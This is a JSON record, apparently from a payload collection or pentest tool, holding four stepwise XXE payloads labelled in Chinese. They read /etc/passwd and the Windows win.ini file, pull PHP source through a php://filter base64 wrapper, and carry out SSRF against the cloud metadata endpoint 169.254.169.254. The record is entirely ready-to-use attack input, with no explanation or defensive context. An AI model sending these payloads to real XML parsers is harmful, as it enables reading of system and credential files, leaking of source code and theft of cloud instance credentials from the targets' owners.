              "id": "8506229b-7994-4455-98db-3d09739f29ab",
              "title": "payload",
              "payload": "# STEP 1 - 1. 探测XXE\n\u003c?xml version\u003d\"1.0\"?\u003e\n\u003c!DOCTYPE foo [\n  \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e\n]\u003e\n\u003croot\u003e\u0026xxe;\u003c/root\u003e\n\n# STEP 2 - 2. 读取文件\n\u003c?xml version\u003d\"1.0\"?\u003e\n\u003c!DOCTYPE foo [\n  \u003c!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\"\u003e\n]\u003e\n\u003croot\u003e\u0026xxe;\u003c/root\u003e\n\n# STEP 3 - 3. 读取PHP源码\n\u003c?xml version\u003d\"1.0\"?\u003e\n\u003c!DOCTYPE foo [\n  \u003c!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource\u003dindex.php\"\u003e\n]\u003e\n\u003croot\u003e\u0026xxe;\u003c/root\u003e\n\n# STEP 4 - 4. SSRF攻击\n\u003c?xml version\u003d\"1.0\"?\u003e\n\u003c!DOCTYPE foo [\n  \u003c!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\"\u003e\n]\u003e\n\u003croot\u003e\u0026xxe;\u003c/root\u003e"
            }
